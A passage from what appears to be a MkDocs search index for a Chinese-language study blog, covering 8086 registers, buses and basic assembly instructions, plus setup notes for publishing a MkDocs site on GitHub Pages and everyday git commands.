8086CPU\u67094\u4e2a\u6bb5\u5bc4\u5b58\u5668\uff1aCS\u3001DS\u3001SS\u3001ES\u3002\u5f538086CPU\u8981\u8bbf\u95ee\u5185\u5b58\u65f6\u7531\u8fd94\u4e2a\u6bb5\u5bc4\u5b58\u5668\u63d0\u4f9b\u5185\u5b58\u5355\u5143\u7684\u6bb5\u5730\u5740","title":"\u6bb5\u5bc4\u5b58\u5668"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8/#_4","text":"CS\u4e3a\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668","title":"\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668"},{"location":"system/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8/#_5","text":"IP\u4e3a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668 \u57288086PC\u673a\u4e2d\uff0c\u4efb\u610f\u65f6\u523b\uff0c\u8bbeCS\u4e2d\u7684\u5185\u5bb9\u4e3aM, IP\u4e2d\u7684\u5185\u5bb9\u4e3aN, 8086CPU\u5c06\u4ece\u5185\u5b58 M \u00d7 16 + N \u5355\u5143\u5f00\u59cb\uff0c\u8bfb\u53d6\u4e00\u6761\u6307\u4ee4\u5e76\u6267\u884c\u3002 \u4e5f\u53ef\u4ee5\u8fd9\u6837\u8868\u8ff0\uff1a8086\u673a\u4e2d\uff0c\u4efb\u610f\u65f6\u523b\uff0cCPU\u5c06CS:IP\u6307\u5411\u7684\u5185\u5bb9\u5f53\u4f5c\u6307\u4ee4\u6267\u884c\u3002 (1) \u4eceCS:IP\u6307\u5411\u7684\u5185\u5b58\u5355\u5143\u8bfb\u53d6\u6307\u4ee4\uff0c\u8bfb\u53d6\u7684\u6307\u4ee4\u8fdb\u5165\u6307\u4ee4\u7f13\u51b2\u5668\uff1b (2) IP=IP+\u6240\u8bfb\u53d6\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u4ece\u800c\u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\uff1b (3) \u6267\u884c\u6307\u4ee4\u3002\u8f6c\u5230\u6b65\u9aa4(1),\u91cd\u590d\u8fd9\u4e2a\u8fc7\u7a0b\u3002 \u4fee\u6539IP\u5bc4\u5b58\u5668\u6307\u4ee4\uff1a \u300ejmp \u67d0\u4e00\u5408\u6cd5\u5bc4\u5b58\u5668\u300f\u6307\u4ee4\u7684\u529f\u80fd\u4e3a\uff1a\u7528\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u4fee\u6539IP jmp ax , \u5728\u542b\u4e49\u4e0a\u597d\u4f3c\uff1amov IP,ax","title":"\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668"},{"location":"system/%E6%B1%87%E7%BC%96/%E6%8E%A7%E5%88%B6%E6%80%BB%E7%BA%BF/","text":"\u63a7\u5236\u603b\u7ebf CPU\u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u662f\u901a\u8fc7\u63a7\u5236\u603b\u7ebf\u6765\u8fdb\u884c\u7684\u3002\u5728\u8fd9\u91cc\u63a7\u5236\u603b\u7ebf\u662f\u4e2a\u603b\u79f0\uff0c\u63a7\u5236 \u603b\u7ebf\u662f\u4e00\u4e9b\u4e0d\u540c\u63a7\u5236\u7ebf\u7684\u96c6\u5408\u3002\u6709\u591a\u5c11\u6839\u63a7\u5236\u603b\u7ebf\uff0c\u5c31\u610f\u5473\u7740CPU\u63d0\u4f9b\u4e86\u5bf9\u5916\u90e8\u5668\u4ef6\u7684 \u591a\u5c11\u79cd\u63a7\u5236\u3002\u6240\u4ee5\uff0c\u63a7\u5236\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU\u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u80fd\u529b\u3002 \u524d\u9762\u6240\u8bb2\u7684\u5185\u5b58\u8bfb\u6216\u5199\u547d\u4ee4\u662f\u7531\u51e0\u6839\u63a7\u5236\u7ebf\u7efc\u5408\u53d1\u51fa\u7684\uff0c\u5176\u4e2d\u6709\u4e00\u6839\u79f0\u4e3a\u201c\u8bfb\u4fe1\u53f7\u8f93 \u51fa\u201d\u7684\u63a7\u5236\u7ebf\u8d1f\u8d23\u7531CPU\u5411\u5916\u4f20\u9001\u8bfb\u4fe1\u53f7\uff0cCPU\u5411\u8be5\u63a7\u5236\u7ebf\u4e0a\u8f93\u51fa\u4f4e\u7535\u5e73\u8868\u793a\u5c06\u8981\u8bfb\u53d6 \u6570\u636e\uff1b\u6709\u4e00\u6839\u79f0\u4e3a\u201c\u5199\u4fe1\u53f7\u8f93\u5c80\u201d\u7684\u63a7\u5236\u7ebf\u5219\u8d1f\u8d23\u4f20\u9001\u5199\u4fe1\u53f7","title":"\u63a7\u5236\u603b\u7ebf"},{"location":"system/%E6%B1%87%E7%BC%96/%E6%8E%A7%E5%88%B6%E6%80%BB%E7%BA%BF/#_1","text":"CPU\u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u662f\u901a\u8fc7\u63a7\u5236\u603b\u7ebf\u6765\u8fdb\u884c\u7684\u3002\u5728\u8fd9\u91cc\u63a7\u5236\u603b\u7ebf\u662f\u4e2a\u603b\u79f0\uff0c\u63a7\u5236 \u603b\u7ebf\u662f\u4e00\u4e9b\u4e0d\u540c\u63a7\u5236\u7ebf\u7684\u96c6\u5408\u3002\u6709\u591a\u5c11\u6839\u63a7\u5236\u603b\u7ebf\uff0c\u5c31\u610f\u5473\u7740CPU\u63d0\u4f9b\u4e86\u5bf9\u5916\u90e8\u5668\u4ef6\u7684 \u591a\u5c11\u79cd\u63a7\u5236\u3002\u6240\u4ee5\uff0c\u63a7\u5236\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU\u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u80fd\u529b\u3002 \u524d\u9762\u6240\u8bb2\u7684\u5185\u5b58\u8bfb\u6216\u5199\u547d\u4ee4\u662f\u7531\u51e0\u6839\u63a7\u5236\u7ebf\u7efc\u5408\u53d1\u51fa\u7684\uff0c\u5176\u4e2d\u6709\u4e00\u6839\u79f0\u4e3a\u201c\u8bfb\u4fe1\u53f7\u8f93 \u51fa\u201d\u7684\u63a7\u5236\u7ebf\u8d1f\u8d23\u7531CPU\u5411\u5916\u4f20\u9001\u8bfb\u4fe1\u53f7\uff0cCPU\u5411\u8be5\u63a7\u5236\u7ebf\u4e0a\u8f93\u51fa\u4f4e\u7535\u5e73\u8868\u793a\u5c06\u8981\u8bfb\u53d6 \u6570\u636e\uff1b\u6709\u4e00\u6839\u79f0\u4e3a\u201c\u5199\u4fe1\u53f7\u8f93\u5c80\u201d\u7684\u63a7\u5236\u7ebf\u5219\u8d1f\u8d23\u4f20\u9001\u5199\u4fe1\u53f7","title":"\u63a7\u5236\u603b\u7ebf"},{"location":"system/%E6%B1%87%E7%BC%96/%E6%95%B0%E6%8D%AE%E6%80%BB%E7%BA%BF/","text":"\u6570\u636e\u603b\u7ebf \u6570\u636e\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86CPU\u548c\u5916\u754c\u7684\u6570\u636e\u4f20\u9001\u901f\u5ea6\u30028\u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4f20\u9001\u4e00\u4e2a8\u4f4d\u4e8c\u8fdb\u5236\u6570\u636e\uff08\u5373\u4e00 \u4e2a\u5b57\u8282\uff09\u300216\u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4f20\u9001\u4e24\u4e2a\u5b57\u8282\u3002 8088CPU\u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a8, 8086CPU\u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a16\u3002\u6211\u4eec\u6765\u5206\u522b\u770b\u4e00\u4e0b\u5b83 \u4eec\u5411\u5185\u5b58\u4e2d\u5199\u5165\u6570\u636e89D8H\u65f6\uff0c\u662f\u5982\u4f55\u901a\u8fc7\u6570\u636e\u603b\u7ebf\u4f20\u9001\u6570\u636e\u7684\u3002 \u56fe1.5\u5c55\u793a\u4e86 8088CPU \u6570\u636e\u603b\u7ebf\u4e0a\u7684\u6570\u636e\u4f20\u9001\u60c5\u51b5 \u56fe1.6\u5c55\u793a\u4e86 8086CPU\u6570\u636e\u603b\u7ebf\u4e0a\u7684\u6570\u636e\u4f20\u9001\u60c5\u51b5","title":"\u6570\u636e\u603b\u7ebf"},{"location":"system/%E6%B1%87%E7%BC%96/%E6%95%B0%E6%8D%AE%E6%80%BB%E7%BA%BF/#_1","text":"\u6570\u636e\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86CPU\u548c\u5916\u754c\u7684\u6570\u636e\u4f20\u9001\u901f\u5ea6\u30028\u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4f20\u9001\u4e00\u4e2a8\u4f4d\u4e8c\u8fdb\u5236\u6570\u636e\uff08\u5373\u4e00 \u4e2a\u5b57\u8282\uff09\u300216\u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4f20\u9001\u4e24\u4e2a\u5b57\u8282\u3002 8088CPU\u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a8, 8086CPU\u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a16\u3002\u6211\u4eec\u6765\u5206\u522b\u770b\u4e00\u4e0b\u5b83 \u4eec\u5411\u5185\u5b58\u4e2d\u5199\u5165\u6570\u636e89D8H\u65f6\uff0c\u662f\u5982\u4f55\u901a\u8fc7\u6570\u636e\u603b\u7ebf\u4f20\u9001\u6570\u636e\u7684\u3002 \u56fe1.5\u5c55\u793a\u4e86 8088CPU \u6570\u636e\u603b\u7ebf\u4e0a\u7684\u6570\u636e\u4f20\u9001\u60c5\u51b5 \u56fe1.6\u5c55\u793a\u4e86 8086CPU\u6570\u636e\u603b\u7ebf\u4e0a\u7684\u6570\u636e\u4f20\u9001\u60c5\u51b5","title":"\u6570\u636e\u603b\u7ebf"},{"location":"system/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%90%88%E9%9B%86/","text":"\u5e38\u7528\u6c47\u7f16\u6307\u4ee4\u5408\u96c6 \u6c47\u7f16\u6307\u4ee4 \u63a7\u5236CPU\u5b8c\u6210\u7684\u64cd\u4f5c \u7528\u9ad8\u7ea7\u8bed\u8a00\u7684\u8bed\u6cd5\u63cf\u8ff0 mov ax,l8 \u5c0618\u9001\u5165\u5bc4\u5b58\u5668AX AX=18 mov ah,78 \u5c0678\u9001\u5165\u5bc4\u5b58\u5668AH AH=78 add ax,8 \u5c06\u5bc4\u5b58\u5668AX\u4e2d\u7684\u6570\u503c\u52a0\u4e0a8 AX=AX+8 mov ax,bx \u5c06\u5bc4\u5b58\u5668BX\u4e2d\u7684\u6570\u636e\u9001\u5165\u5bc4\u5b58\u5668AX AX=BX add ax,bx \u5c06AX\u548cBX\u4e2d\u7684\u6570\u503c\u76f8\u52a0\uff0c\u7ed3\u679c\u5b58\u5728AX\u4e2d AX=AX+BX jmp ax \u5c06AX\u4e2d\u7684\u5185\u5b58\u5b58\u5165IP\u5bc4\u5b58\u5668\u4e2d jmp 2AE3:3 CS=2AE3H, IP=0003H, CPU \u5c06\u4ece 2AE33H \u5904\u8bfb\u53d6\u6307\u4ee4","title":"\u6c47\u7f16\u6307\u4ee4\u5408\u96c6"},{"location":"system/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%90%88%E9%9B%86/#_1","text":"\u6c47\u7f16\u6307\u4ee4 \u63a7\u5236CPU\u5b8c\u6210\u7684\u64cd\u4f5c \u7528\u9ad8\u7ea7\u8bed\u8a00\u7684\u8bed\u6cd5\u63cf\u8ff0 mov ax,l8 \u5c0618\u9001\u5165\u5bc4\u5b58\u5668AX AX=18 mov ah,78 \u5c0678\u9001\u5165\u5bc4\u5b58\u5668AH AH=78 add ax,8 \u5c06\u5bc4\u5b58\u5668AX\u4e2d\u7684\u6570\u503c\u52a0\u4e0a8 AX=AX+8 mov ax,bx \u5c06\u5bc4\u5b58\u5668BX\u4e2d\u7684\u6570\u636e\u9001\u5165\u5bc4\u5b58\u5668AX AX=BX add ax,bx \u5c06AX\u548cBX\u4e2d\u7684\u6570\u503c\u76f8\u52a0\uff0c\u7ed3\u679c\u5b58\u5728AX\u4e2d AX=AX+BX jmp ax \u5c06AX\u4e2d\u7684\u5185\u5b58\u5b58\u5165IP\u5bc4\u5b58\u5668\u4e2d jmp 2AE3:3 CS=2AE3H, IP=0003H, CPU \u5c06\u4ece 2AE33H \u5904\u8bfb\u53d6\u6307\u4ee4","title":"\u5e38\u7528\u6c47\u7f16\u6307\u4ee4\u5408\u96c6"},{"location":"tool/","text":"\u4e00\u4e9b\u5de5\u5177\u7684\u8bb0\u5f55","title":"\u4e00\u4e9b\u5de5\u5177\u7684\u8bb0\u5f55"},{"location":"tool/#_1","text":"","title":"\u4e00\u4e9b\u5de5\u5177\u7684\u8bb0\u5f55"},{"location":"tool/MkDoc/","text":"\u90e8\u7f72MkDocs \u5b89\u88c5Python\uff0cPycharm\uff0cGit \u53c2\u8003\uff1a \u200b git\u53cagithub\u7684\u8f7b\u5ea6\u6559\u7a0b - MarkDown_Log (yinzhipeng123.github.io) \u200b Pycharm\u53ca\u914d\u5408Github\u7684\u4f7f\u7528 - MarkDown_Log (yinzhipeng123.github.io) \u4f7f\u7528\u4e0a\u4e24\u7bc7\u6587\u7ae0\u7684Github\u9879\u76ee\uff0c\u6839\u636e\u4e0a\u4e24\u7bc7\u6587\u7ae0\uff08\u770b\u5b8c\uff09\uff0c\u5728\u9879\u76ee\u4e2d\uff0cPython\u4f9d\u8d56\u5b89\u88c5Markdown\uff0cmkdocs Pycharm\u7ec8\u7aef\u5185\u8f93\u5165 pip3 install Markdown==3.3.4 pip3 install mkdocs==1.3.0 \u7136\u540e\u4fee\u6539\u4e0bPycharm\u7684\u7ec8\u7aef\u8bbe\u7f6e \u5982\u4e0b\u56fe\u64cd\u4f5c mkdocs new . # \u521b\u5efa\u6240\u9700\u6587\u4ef6\uff1adocs \u548c mkdocs.yml # \u4fee\u6539docs\u4e0b\u7684\u6587\u4ef6\uff0c\u7528markdown\u7f16\u8f91\u5668\uff08\u6211\u63a8\u8350Typora\uff09\u5bf9\u7f51\u7ad9\u5185\u5bb9\u8fdb\u884c\u7f16\u8f91 # mkdocs.yml\u4e3a\u7f51\u7ad9\u7684\u7d22\u5f15\u53ca\u914d\u7f6e\u6587\u4ef6 # \u4ee5\u4e0a\u8be6\u7ec6\u53c2\u8003https://www.mkdocs.org/getting-started/ # \u6709\u4e2a\u9879\u76ee\u5b8c\u5168\u7528\u7684mkdocs\u8fdb\u884cAPI\u53d1\u5e03\uff0c\u9875\u9762\u5730\u5740https://siddhi-io.github.io/siddhi/ # mkdocs serve # \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u672c\u5730\u5c55\u793a\u7f51\u7ad9\uff0c\u8bbf\u95ee127.0.0.1:8000\u8fdb\u884c\u9884\u89c8 mkdocs build #\u6839\u636e\u6587\u4ef6\u751f\u6210\u7f51\u7ad9\u6587\u4ef6 # \u751f\u6210\u76ee\u5f55site\uff0c\u76ee\u5f55\u5185\u6587\u4ef6\u4e3a\u7f51\u7ad9\u9759\u6001\u6587\u4ef6 \u628a site \u76ee\u5f55\u4e2d\u5185\u5bb9\u653e\u7f6e\u5230\u9879\u76ee\u6839\u76ee\u5f55 \u53ef\u4ee5\u5728\u7ec8\u7aef\u91cc\u9762\u8fdb\u884c\u4ee3\u7801\u7684\u63d0\u4ea4 git add ./ -A git commit -m '\u8fd9\u6b21\u63d0\u4ea4\u7684\u540d\u5b57' git push GitHub Pages\u53d1\u5e03 Github\u9879\u76ee\u9700\u8981\u8bbe\u7f6e\u4e0b\uff0c\u5982\u56fe\u6240\u793a \u7136\u540e\u8bbf\u95ee\u8be5\u5730\u5740 \u7f8e\u5316MkDocs cmd\u4e2d\u6267\u884cpip pip install mkdocs-windmill \u4fee\u6539mkdocs.yml\uff0c\u6dfb\u52a0\u884ctheme: windmill\uff0c\u4f7f\u7528nav site_name: markdown_log site_url: https://yinzhipeng123.github.io/learn/ nav: - MkDocs: index.md - \u6587\u7ae0\u5217\u8868: - MkDocs: api/MkDoc.md theme: windmill Pycharm \u7ec8\u7aef\u8f93\u5165\u4e0b\u9762\u547d\u4ee4\u8fdb\u884c\u9884\u89c8 mkdocs serve \u63d0\u4ea4\u4ee3\u7801 git add -A git commit -m '\u4fee\u6539\u6587\u4ef6' git push origin main \u4e3a\u4ec0\u4e48\u8981\u5199\u535a\u5ba2 \u5f53\u6211\u8981\u56de\u7b54\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u9700\u8981\u786e\u5b9a\u81ea\u5df1\u5bf9\u8fd9\u4e2a\u95ee\u9898\u6240\u6d89\u53ca\u5230\u7684\u6280\u672f\u90fd\u4e86\u7136\u4e8e\u5fc3\uff0c\u4e0d\u7136\u5199\u51fa\u6765\u7684\u4e1c\u897f\u5982\u679c\u662f\u9519\u7684\u8bdd\uff0c\u59d1\u4e14\u4e0d\u8bf4\u4e22\u4e0d\u4e22\u4eba\uff0c\u6700\u91cd\u8981\u7684\u662f\u8fd9\u6837\u4f1a\u8bef\u4eba\u5b50\u5f1f\u3002\u6240\u4ee5\u5982\u679c\u770b\u5230\u4e00\u4e2a\u95ee\u9898\u6211\u5e76\u4e0d\u662f\u975e\u5e38\u4e86\u89e3\uff0c\u6211\u4e0d\u4f1a\u7b2c\u4e00\u65f6\u95f4\u5c31\u53bb\u56de\u7b54\uff0c\u800c\u662f\u81ea\u5df1\u53bb\u7814\u7a76\u4e00\u8f6e\uff0c\u7814\u7a76\u900f\u5f7b\u4e86\uff0c\u518d\u53bb\u56de\u7b54\u95ee\u9898\u3002\u5728\u8fd9\u4e48\u4e00\u4e2a\u8fc7\u7a0b\u5f53\u4e2d\uff0c \u6211\u53c8\u5de9\u56fa\u4e86\u4ee5\u524d\u7684\u77e5\u8bc6\uff0c\u5e76\u5b66\u4e60\u5230\u4e86\u65b0\u7684\u77e5\u8bc6\uff0c\u987a\u5e26\u8fd8\u5e2e\u52a9\u5230\u63d0\u51fa\u95ee\u9898\u7684\u4eba\uff0c\u8fd9\u662f\u53cc\u8d62\u7684\uff0c\u4f55\u4e50\u800c\u4e0d\u4e3a \uff1f \u53e6\u5916\uff0c \u591a\u5199\u4e1c\u897f\uff0c\u53ef\u4ee5\u63d0\u9ad8\u4f60\u7684\u8868\u8fbe\u80fd\u529b \u3002","title":"MkDocs\u7684\u4f7f\u7528"},{"location":"tool/MkDoc/#mkdocs","text":"\u5b89\u88c5Python\uff0cPycharm\uff0cGit \u53c2\u8003\uff1a \u200b git\u53cagithub\u7684\u8f7b\u5ea6\u6559\u7a0b - MarkDown_Log (yinzhipeng123.github.io) \u200b Pycharm\u53ca\u914d\u5408Github\u7684\u4f7f\u7528 - MarkDown_Log (yinzhipeng123.github.io) \u4f7f\u7528\u4e0a\u4e24\u7bc7\u6587\u7ae0\u7684Github\u9879\u76ee\uff0c\u6839\u636e\u4e0a\u4e24\u7bc7\u6587\u7ae0\uff08\u770b\u5b8c\uff09\uff0c\u5728\u9879\u76ee\u4e2d\uff0cPython\u4f9d\u8d56\u5b89\u88c5Markdown\uff0cmkdocs Pycharm\u7ec8\u7aef\u5185\u8f93\u5165 pip3 install Markdown==3.3.4 pip3 install mkdocs==1.3.0 \u7136\u540e\u4fee\u6539\u4e0bPycharm\u7684\u7ec8\u7aef\u8bbe\u7f6e \u5982\u4e0b\u56fe\u64cd\u4f5c mkdocs new . # \u521b\u5efa\u6240\u9700\u6587\u4ef6\uff1adocs \u548c mkdocs.yml # \u4fee\u6539docs\u4e0b\u7684\u6587\u4ef6\uff0c\u7528markdown\u7f16\u8f91\u5668\uff08\u6211\u63a8\u8350Typora\uff09\u5bf9\u7f51\u7ad9\u5185\u5bb9\u8fdb\u884c\u7f16\u8f91 # mkdocs.yml\u4e3a\u7f51\u7ad9\u7684\u7d22\u5f15\u53ca\u914d\u7f6e\u6587\u4ef6 # \u4ee5\u4e0a\u8be6\u7ec6\u53c2\u8003https://www.mkdocs.org/getting-started/ # \u6709\u4e2a\u9879\u76ee\u5b8c\u5168\u7528\u7684mkdocs\u8fdb\u884cAPI\u53d1\u5e03\uff0c\u9875\u9762\u5730\u5740https://siddhi-io.github.io/siddhi/ # mkdocs serve # \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u672c\u5730\u5c55\u793a\u7f51\u7ad9\uff0c\u8bbf\u95ee127.0.0.1:8000\u8fdb\u884c\u9884\u89c8 mkdocs build #\u6839\u636e\u6587\u4ef6\u751f\u6210\u7f51\u7ad9\u6587\u4ef6 # \u751f\u6210\u76ee\u5f55site\uff0c\u76ee\u5f55\u5185\u6587\u4ef6\u4e3a\u7f51\u7ad9\u9759\u6001\u6587\u4ef6 \u628a site \u76ee\u5f55\u4e2d\u5185\u5bb9\u653e\u7f6e\u5230\u9879\u76ee\u6839\u76ee\u5f55 \u53ef\u4ee5\u5728\u7ec8\u7aef\u91cc\u9762\u8fdb\u884c\u4ee3\u7801\u7684\u63d0\u4ea4 git add ./ -A git commit -m '\u8fd9\u6b21\u63d0\u4ea4\u7684\u540d\u5b57' git push","title":"\u90e8\u7f72MkDocs"},{"location":"tool/MkDoc/#github-pages","text":"Github\u9879\u76ee\u9700\u8981\u8bbe\u7f6e\u4e0b\uff0c\u5982\u56fe\u6240\u793a \u7136\u540e\u8bbf\u95ee\u8be5\u5730\u5740","title":"GitHub Pages\u53d1\u5e03"},{"location":"tool/MkDoc/#mkdocs_1","text":"cmd\u4e2d\u6267\u884cpip pip install mkdocs-windmill \u4fee\u6539mkdocs.yml\uff0c\u6dfb\u52a0\u884ctheme: windmill\uff0c\u4f7f\u7528nav site_name: markdown_log site_url: https://yinzhipeng123.github.io/learn/ nav: - MkDocs: index.md - \u6587\u7ae0\u5217\u8868: - MkDocs: api/MkDoc.md theme: windmill Pycharm \u7ec8\u7aef\u8f93\u5165\u4e0b\u9762\u547d\u4ee4\u8fdb\u884c\u9884\u89c8 mkdocs serve \u63d0\u4ea4\u4ee3\u7801 git add -A git commit -m '\u4fee\u6539\u6587\u4ef6' git push origin main","title":"\u7f8e\u5316MkDocs"},{"location":"tool/MkDoc/#_1","text":"\u5f53\u6211\u8981\u56de\u7b54\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u9700\u8981\u786e\u5b9a\u81ea\u5df1\u5bf9\u8fd9\u4e2a\u95ee\u9898\u6240\u6d89\u53ca\u5230\u7684\u6280\u672f\u90fd\u4e86\u7136\u4e8e\u5fc3\uff0c\u4e0d\u7136\u5199\u51fa\u6765\u7684\u4e1c\u897f\u5982\u679c\u662f\u9519\u7684\u8bdd\uff0c\u59d1\u4e14\u4e0d\u8bf4\u4e22\u4e0d\u4e22\u4eba\uff0c\u6700\u91cd\u8981\u7684\u662f\u8fd9\u6837\u4f1a\u8bef\u4eba\u5b50\u5f1f\u3002\u6240\u4ee5\u5982\u679c\u770b\u5230\u4e00\u4e2a\u95ee\u9898\u6211\u5e76\u4e0d\u662f\u975e\u5e38\u4e86\u89e3\uff0c\u6211\u4e0d\u4f1a\u7b2c\u4e00\u65f6\u95f4\u5c31\u53bb\u56de\u7b54\uff0c\u800c\u662f\u81ea\u5df1\u53bb\u7814\u7a76\u4e00\u8f6e\uff0c\u7814\u7a76\u900f\u5f7b\u4e86\uff0c\u518d\u53bb\u56de\u7b54\u95ee\u9898\u3002\u5728\u8fd9\u4e48\u4e00\u4e2a\u8fc7\u7a0b\u5f53\u4e2d\uff0c \u6211\u53c8\u5de9\u56fa\u4e86\u4ee5\u524d\u7684\u77e5\u8bc6\uff0c\u5e76\u5b66\u4e60\u5230\u4e86\u65b0\u7684\u77e5\u8bc6\uff0c\u987a\u5e26\u8fd8\u5e2e\u52a9\u5230\u63d0\u51fa\u95ee\u9898\u7684\u4eba\uff0c\u8fd9\u662f\u53cc\u8d62\u7684\uff0c\u4f55\u4e50\u800c\u4e0d\u4e3a \uff1f \u53e6\u5916\uff0c \u591a\u5199\u4e1c\u897f\uff0c\u53ef\u4ee5\u63d0\u9ad8\u4f60\u7684\u8868\u8fbe\u80fd\u529b \u3002","title":"\u4e3a\u4ec0\u4e48\u8981\u5199\u535a\u5ba2"},{"location":"tool/github/","text":"github \u6bd4\u8f83\u597d\u7528\u7684\u4ee3\u7801\u5bf9\u6bd4\u65b9\u6cd5 \u9009\u62e9\u7248\u672c\u4e4b\u540e\uff0c\u70b9\u51fbcompare\u540e\uff0c\u53ef\u4ee5\u9009\u62e9\u548c\u5176\u4ed6\u7248\u672c\u4e4b\u524d\u53d8\u52a8\u4e86\u54ea\u91cc","title":"github\u4ee3\u7801\u5bf9\u6bd4"},{"location":"tool/github/#github","text":"\u9009\u62e9\u7248\u672c\u4e4b\u540e\uff0c\u70b9\u51fbcompare\u540e\uff0c\u53ef\u4ee5\u9009\u62e9\u548c\u5176\u4ed6\u7248\u672c\u4e4b\u524d\u53d8\u52a8\u4e86\u54ea\u91cc","title":"github \u6bd4\u8f83\u597d\u7528\u7684\u4ee3\u7801\u5bf9\u6bd4\u65b9\u6cd5"},{"location":"tool/github%E4%BD%BF%E7%94%A8/","text":"git\u53cagithub\u7684\u4f7f\u7528 git \u57fa\u672c\u6982\u5ff5\uff1a git - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) git \u662f\u4e00\u4e2a \u5206\u5e03\u5f0f \u4ee3\u7801\u7ba1\u7406\u5de5\u5177\uff0c git \u5728\u672c\u5730\u4f1a\u6709\u5efa\u7acb\u4e2a\u6570\u636e\u5e93\uff0c\u5f53\u6211\u4eec\u4fee\u6539\u5b8c\u4ee3\u7801\u540e\uff0c git \u4f1a\u4fdd\u5b58\u76f8\u5e94\u7684\u53d8\u5316\u5230\u6570\u636e\u5e93\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u628a\u53d8\u5316\u53ca\u6587\u4ef6\u4fdd\u5b58\u5230 \u4e2d\u592e\u670d\u52a1\u5668 \uff0c\u5f53\u67e5\u770b\u522b\u4eba\u4fee\u6539\u7684\u8bb0\u5f55\u65f6\uff0c\u53c8\u53ef\u4ee5\u4ece\u4e2d\u592e\u670d\u52a1\u5668\u62c9\u53d6\u6570\u636e\u5230\u672c\u5730\u6570\u636e\u5e93\uff0c\u4ece\u672c\u5730\u67e5\u770b\u522b\u4eba\u7684\u4fee\u6539\u8fc7\u7684\u5185\u5bb9\u53ca\u6700\u65b0\u7684\u6587\u4ef6 \u4e2a\u4eba\u4f7f\u7528git\u9700\u8981\u638c\u63e1\u7684\u4e00\u4e9b\u547d\u4ee4 \u4ece\u4e2d\u592e\u670d\u52a1\u5668\u62c9\u53d6\u5e76\u521b\u5efa\u672c\u5730\u6570\u636e\u5e93 git clone https://xxx.com/xxx/xxx.git \u6682\u5b58\u6240\u6709\u6587\u4ef6\u53ca\u53d8\u5316 git add ./ -A \u63d0\u4ea4\u6682\u5b58\u5230\u672c\u5730git\u6570\u636e\u5e93\u4e2d git commit -m '\u8fd9\u6b21\u63d0\u4ea4\u7684\u540d\u5b57' \u63a8\u9001\u672c\u5730\u6570\u636e\u5e93\u5230\u4e2d\u592e\u670d\u52a1\u5668 git push \u62c9\u53d6\u4e2d\u592e\u670d\u52a1\u5668\u7684\u4ee3\u7801\u5230\u672c\u5730\u6570\u636e\u5e93\u4e2d git pull \u5b89\u88c5 Windows10\u4e0a\u5b89\u88c5 Git - Downloads (git-scm.com) \u6b64\u5730\u5740\u4e3aGIT\u5b98\u7f51\u4e0b\u8f7d\u5730\u5740\uff0c\u9009\u62e9Windows\uff0c\u9009\u62e964-bit Git for Windows Setup\uff0c\u7136\u540e\u4e0b\u8f7d\u5b89\u88c5\uff0c\u9009\u62e9\u5b89\u88c5\u4f4d\u7f6e\uff0c\u6839\u636e\u81ea\u5df1\u9700\u6c42\u9009\u62e9\uff0c\u5176\u4e2d\u6709\u4e00\u9879\u5b89\u88c5\u9009\u9879\uff0c\u5982\u4e0b\u56fe\u9009\u62e9\uff0c\u7ed9Windows\u53f3\u952e\u6dfb\u52a0\u5feb\u901f\u8fdb\u5165git\u7684\u5feb\u6377\u65b9\u5f0f\uff08Git Bash Here\u3001Git GUI Here\uff09\u3001\u6dfb\u52a0git\u73af\u5883\u914d\u7f6e\u6587\u4ef6\u5728CMD\u4e2d\uff08\u56fe\u4e2d\u6700\u540e\u4e00\u9879\uff09\uff0c\u52fe\u9009\u8fd9\u51e0\u9879\u4f1a\u7ed9\u4f7f\u7528\u6dfb\u52a0\u5f88\u591a\u4fbf\u5229 \u5b89\u88c5\u5b8c\u4e4b\u540e\u7684\u6837\u5b50\uff0c\u5982\u4e0b\u56fe\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u76ee\u5f55\u4e0b\uff0c\u5feb\u901f\u8fdb\u5165git github\u7684\u4f7f\u7528 GitHub - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) github\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e16\u754c\u4e0a\u6700\u5927\u7684 git\u4e2d\u592e\u670d\u52a1\u5668 